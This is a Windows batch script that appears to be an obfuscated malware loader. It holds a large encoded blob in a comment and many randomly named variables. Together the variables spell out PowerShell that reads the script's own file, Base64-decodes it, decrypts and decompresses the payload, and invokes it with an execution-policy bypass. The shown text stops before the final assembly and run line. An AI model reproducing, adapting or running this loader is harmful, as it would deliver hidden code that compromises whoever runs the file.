@echo off
:: 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
set "apejiWEOZq= %~dp0"
set "yHtYjLSbuN=cd"
set "PBjZjkORnL=ew-O"
set "CGkjhpVIiU=Comp"
set "DQYZJFaKfj=();$"
set "rayKitKtfX==');"
set "BFWtpJsUdM=iron"
set "umitrPGjKb=Tgk."
set "DohfjULxjo=trea"
set "CPTcPNDayf=();$"
set "HuhbXkcwxE=se()"
set "qrIfefGFhd=.Dis"
set "qOrumFMBAh=xH.I"
set "UGGygsUjaW=rtS4"
set "shicmmaxvP=::('"
set "jCaDhQCQkZ=gnir"
set "aLPuRXSZXm=morF"
set "LTsegRtKzI=ne);"
set "EgkdERpjZH=pStr"
set "OMeBZmmaAb=6] -"
set "XbvrYalIFP=tS46"
set "ABLazPdktW=  $a"
set "nDXXMsNsDM=('da"
set "iPImewKTaw=StXZ"
set "KcZuTcKFdE=Ixua"
set "BzMHPmlSdx=Mode"
set "DcmfwgZeLv=Fina"
set "wWwEGseJge=k; }"
set "HjSYWaikkb=Conv"
set "nkMtgXAQhn=n ''"
set "ATDfdUZkug=ert]"
set "fSfXKIQCLz=.Con"
set "sCyipRehwK=gMod"
set "eazOOdNvQT=lit("
set "EaIrixABhm=1..-"
set "svOuBTYyjj=$uSt"
set "iUPftAwRhK=157K"
set "bzftMkEjPl=6esa"
set "eEyIsMBFro=embl"
set "QnAywwrTXk=('%~f0'"
set "cFVYuYgoKa=N) {"
set "NICeyiqyEX=ypto"
set "FhFYbLjsXH= [Sy"
set "MquYReEjaz=Secu"
set "CAljYBnmDj=$YjS"
set "HtaDajYgNz=[Sys"
set "ABUbmIkXRz=vKGT"
set "PvPfWKYTpF=eam("
set "SIPKetYGMg=.Cry"
set "IcYUbdZPYM=d;$q"
set "ONQXmhwHOx=);$U"
set "EGUUlMVuvy=tion"
set "DrLPdyfuNi=Kq.D"
set "tCjRsHHVOy=y.Ci"
set "xYIEyeeUBb=.-16"
set "fGwkMZGrjd=yM.T"
set "sGpxJrKlZl=;$Jp"
set "YvvFQFlEdG=ateD"
set "hgpxzmXFSN= = $"
set "InjamZbyAz=XyM "
set "djFpyFeyvX=('KY"
set "KWnGkeFtMS=);$u"
set "BNJNFAczYA=;$ia"
set "WJCBUVixuJ=qDxH"
set "BlrdNsniBf=YjSw"
set "CVGxMqospu=ionM"
set "ZvPgZfmFty=[Sys"
set "NOGMfAzzOy=.GZi"
set "jkmdhizWzY=$uSt"
set "WGUTwMbIot='gni"
set "McMuyxyNlV=XZ ="
set "JHbufQOCjf=.Mod"
set "BHSszkNhLN=ptog"
set "EVyxqEUcEO=..-1"
set "rpkBUJkQYb=$iad"
set "kpdhQzRSvU=-1.."
set "qKdOKXjAeR=urit"
set "dObeAGspvr=Invo"
set "LpelmsddeI= [Sy"
set "ouzYIpIKaH=::De"
set "pDYalSuMHO== $q"
set "kWYqpUHIzl=:: '"
set "ArPeAxwlLw=).Sp"
set "gMXsESCame=null"
set "hulapzOGSe= = ["
set "MnmvFOPOIw=tsWi"
set "czrOFCAFgX=lBlo"
set "kotBZzaxaP=/a3B"
set "ALnhTFWdqR=yTo("
set "vJXjGmfrAe=ose("
set "EyJrjAbQLJ=esaB"
set "ZOffEMwlhZ=ispo"
set "eqOqyHmtZq=y.Pa"
set "oqkfcmVlJT=brea"
set "HXQuNZxaZS=]::C"
set "YznbWprdbY=ach "
set "pxFTRnctJQ=Secu"
set "sVoWhykJnk=]::("
set "HpmvNLnozN=th('"
set "XiqnLnLAFx=SoYj"
set "hmLsyvyoiS=join"
set "KUpxGFDSNI=fore"
set "MvoyuJQART=x = "
set "sdRtXYHvUS=Etk/"
set "JVcdGHKSGb=]::N"
set "VPQIYYvNOP=] -j"
set "VNtZGwyXsg=n ''"
set "swPMWulAhW=Obje"
set "OkUGGwEFaQ=ect "
set "trLdGLQbkd=stem"
set "lYhpOWwWjq=-ep "
set "jufuqaQWwl=;$vQ"
set "iJFQABHBVa=-4] "
set "fpxllktWhR=New-"
set "INssvZbKvs=mory"
set "FMzyhCwlks=O.Me"
set "AJctqqhKjN=.IO."
set "zrZzoOTpYY=wx);"
set "OxLzgavHqq=gN+y"
set "nrkIqrLOET=g = "
set "zWBTeXdihG=.Sec"
set "bVwcrWLnFe=stem"
set "wvGeeshISq=comm"
set "qgedlSsvoU=Syst"
set "hTfEmYVkvW=XyM."
set "yalISzdZMz=x = "
set "SejoiKPUeO=b6t6"
set "jpEUNXlsNS=ptor"
set "QxvvUzefzf=ewLi"
set "aApPHaaDOk=tem."
set "KmPgpbNmsn=sion"
set "dDApMHUlSf= = $"
set "KbnmZpORLp=();$"
set "vUsZvBSGaG=7;$q"
set "jUXUwNabvi=[Sys"
set "hwIldxKuYj=x, 0"
set "azArqZwhLY=bjec"
set "ZuQHDhtDnj= [st"
set "EELScipgBA=q = "
